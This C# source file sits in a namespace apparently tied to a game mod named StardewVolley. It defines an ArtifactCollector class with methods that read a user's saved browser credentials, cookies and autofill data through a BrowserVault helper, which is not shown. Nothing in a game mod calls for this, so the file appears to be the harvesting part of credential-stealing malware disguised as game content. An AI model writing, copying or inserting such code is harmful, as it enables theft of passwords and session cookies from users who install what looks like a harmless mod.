namespace StardewVolley.Internal;

internal sealed class ArtifactCollector
{
	private readonly BrowserVault vault;

	public ArtifactCollector(BrowserVault vault)
	{
		this.vault = vault;
	}

	public BrowserArtifact[] CollectCredentials()
	{
		return this.vault.ReadArtifacts(BrowserFile.Credentials);
	}

	public BrowserArtifact[] CollectCookies()
	{
		return this.vault.ReadArtifacts(BrowserFile.Cookies);
	}

	public BrowserArtifact[] CollectAutofill()
	{
		return this.vault.ReadArtifacts(BrowserFile.Autofill);
	}
}
